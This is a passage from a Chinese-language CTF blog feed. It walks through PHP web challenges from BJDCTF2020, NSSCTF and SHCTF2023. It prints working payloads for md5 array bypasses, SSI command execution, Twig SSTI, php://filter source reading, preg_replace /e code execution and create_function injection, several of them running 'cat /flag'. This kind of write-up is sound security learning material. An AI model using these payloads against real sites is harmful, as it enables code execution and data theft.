=== <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>很绕，但是主要就是要选定在哪里去输出这个<code>$flag</code>,很明显，要同时都不exit是不可能的，因为<code>if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)</code>与<code>if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)</code>是矛盾的，所以只能通过某一个的exit去读取flag，通过分析，传入<code>?yds=flag</code>，这时候<code>$$x=$$y</code>这个操作实际上就是将$yds赋值为$flag，我们不设置post，那么在后面就会<code>exit($yds)</code>，这样就输出了<code>$flag</code></p><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><p>随便输入，抓包，在请求头中发现这是一个md5注入，输入<code>ffifdyop</code>在md5后为用真式，然后就进入了<code>levels91.php</code>界面，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: levell14.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>md5弱比较，直接数组绕过一下<code>a[]=1&amp;b[]=2</code></p><p>进入<code>levell14.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5强比较，还是可以数组绕过。<code>param1[]=1&amp;param2[]=2</code></p><h2 id="easysearch"><a href="#easysearch" class="headerlink" title="easysearch"></a>easysearch</h2><p>扫一下目录，发现交换文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显是一个md5强碰撞，password经过md5后的前6位为<code>6d0bc1</code>即可，经过爆破可以拿到密码为<code>2020666</code>，后面钩子什么提示都没有，最后在网络包里发现提示：</p><p><img src="/2023/11/26/BJDCTF2020/ezsearch.png"></p><p>登录时这个username就是注入点，这里有个知识点：<a href="https://www.zhangfangzhou.cn/apache-ssi-configuration.html">https://www.zhangfangzhou.cn/apache-ssi-configuration.html</a></p><p>ssi漏洞，这道题并没有限制，直接用exec执行即可，payload：<code>&lt;!--#exec cmd=&#39;命令执行&#39;--&gt;</code></p><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>首先进入hint，问怎么知道ip的，通过测试可以知道是<code>X-Forwarded-For</code>,在这里可以直接进行ssti注入</p><h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>跟上面一样，不过注入点在cookie，payload：<code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p><h2 id="zj-advenced"><a href="#zj-advenced" class="headerlink" title="zj-advenced"></a>zj-advenced</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>伪协议利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><p>拿到next.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$str)</code>,<a href="https://xz.aliyun.com/t/2557%EF%BC%8Cpayload%EF%BC%9A%60?%5CS*=$%7Bgetflag()%7D&cmd=system">https://xz.aliyun.com/t/2557，payload：`?\S*=${getflag()}&amp;cmd=system</a>(‘cat &#x2F;flag’);&#96;，在进行比较时，让$re匹配到$str,&#x2F;e可以把可变变量先执行。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛事复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF</title>
      <link href="/2023/11/21/NSSCTF/"/>
      <url>/2023/11/21/NSSCTF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="关于NSSCTF中一些web杂题"><a href="#关于NSSCTF中一些web杂题" class="headerlink" title="关于NSSCTF中一些web杂题"></a>关于NSSCTF中一些web杂题</h1><h2 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面简单的绕过，之谈最后一步，这里遇到<code>$a(&#39;&#39;,$b);</code>这样一个奇怪的步骤，由于<code>$b</code>前面有内容，直接命名代码执行显然行不通，那么这里就是很典型的代码注入绕过(<strong>create_function注入</strong>)，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$left,$right&#x27;</span>,<span class="string">&#x27;return($left+$right);&#125;eval($_GET[a]);&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里实际上执行的是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"><span class="variable">$left</span>,<span class="variable">$right</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$left</span>+<span class="variable">$right</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[a]);</span><br></pre></td></tr></table></figure><p>这样就很明白了，我们直接构造代码，读取文件，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\create_function&amp;b=return 111;&#125;system(&#x27;cat /flag&#x27;);/*</span><br></pre></td></tr></table></figure><p><code>\</code>是为了绕过正则，加<code>\*</code>是为了识别后面的代码</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF2023一些题目的思考</title>
      <link href="/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="关于SHCTF一些题目的思考"><a href="#关于SHCTF一些题目的思考" class="headerlink" title="关于SHCTF一些题目的思考"></a>关于SHCTF一些题目的思考</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="MD5的事就拜托了"><a href="#MD5的事就拜托了" class="headerlink" title="MD5的事就拜托了"></a>MD5的事就拜托了</h4><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$$scheme</span>===<span class="string">&#x27;SHCTF&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>*<span class="number">100</span>!=<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>*<span class="number">100</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]!=<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$num</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;flag is&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h4><p>首先是关于<code>extract</code>函数，<code>extract</code>函数是将关联数组的键值作为变量名，将键值的值作为变量的值，如下：</p><p><img src="/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/first.png"></p><p>这里可以看到，extract函数将键值xiaoming转换成了变量，而变量对应的值就是键值对应的值</p><h4 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h4><p>再来看<code>parse_url</code>函数，parse_url — 解析 URL，返回其组成部分：</p><p><img src="/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/second.png"></p><p>其返回值：</p><p><img src="/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/third.png"></p><p>当然，我们也可以自己构造一个url，例如：</p><p><img src="/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/forth.png"></p><p>这里我们构造一个user的协议，此时开始的索引即<code>schema</code>就是<code>user</code>,然后一级一级索引，值得注意的是，此函数只会将最后一个@后面的值解析为host，例如：</p><p><img src="/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/five.png"></p><p>这里可以看到最后一个@前的内容都被解析为了pass的值，如果host不指定值，即@后面不接任何值或没有@且没有多余的值赋给host或在协议中多添加,如：<code>user:///www.baidu.com</code>，这时会直接返回false.</p><h4 id="间接引用构建变量名，形成变量覆盖"><a href="#间接引用构建变量名，形成变量覆盖" class="headerlink" title="间接引用构建变量名，形成变量覆盖"></a>间接引用构建变量名，形成变量覆盖</h4><p>通过上面的分析，我们知道只需要通过两次间接引用<code>schema</code>变量后的值要等于<code>&#39;SHCTF&#39;</code>就行，什么是间接引用，如下：</p><p><img src="/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/six.png"></p><p>所以在schema索引的第三个值应该为<code>SHCTF</code>，所以可以构造url通过parse_url函数和extract函数解析后，满足这个要求，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user://pass:SHCTF@任意值</span><br></pre></td></tr></table></figure><p>这里通过解析后可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$schema=&quot;user&quot;</span><br><span class="line">$user=&quot;pass&quot;</span><br><span class="line">$pass=&quot;SHCTF&quot;</span><br></pre></td></tr></table></figure><p>那么<code>$$$schema=&quot;SHCTF&quot;</code>,这时会给到flag的md5值</p><h4 id="哈希扩展攻击"><a href="#哈希扩展攻击" class="headerlink" title="哈希扩展攻击"></a><a href="https://www.freebuf.com/articles/database/164019.html">哈希扩展攻击</a></h4><p>我们知道第二个if会给到flag的长度，最后是比较传入的值要等于flag和传入num值url解码的字符串的md5值，由于知道了flag中的部分字符（固定最后一位为}）以及flag的md5值和长度,这时候就可以进行哈希扩展攻击，</p><p><img src="/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/seven.png"></p><p><img src="/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/eight.png"></p><p><img src="/2023/11/14/SHCTF2023%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84%E6%80%9D%E8%80%83/nign.png"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛事复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于php序列化与反序列化</title>
      <link href="/2023/11/03/%E5%85%B3%E4%BA%8Ephp%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/03/%E5%85%B3%E4%BA%8Ephp%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="关于PHP序列化与反序列化"><a href="#关于PHP序列化与反序列化" class="headerlink" title="关于PHP序列化与反序列化"></a>关于PHP序列化与反序列化</h1><h2 id="什么是PHP序列化与反序列化"><a href="#什么是PHP序列化与反序列化" class="headerlink" title="什么是PHP序列化与反序列化"></a>什么是PHP序列化与反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>()     <span class="comment">//将一个对象转换成一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>()   <span class="comment">//将字符串还原成一个对象</span></span><br></pre></td></tr></table></figure><p>序列化与反序列化方便了对象数据的传递，但是攻击者可以通过构造序列化字符串以控制反序列化，形成反序列化攻击：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 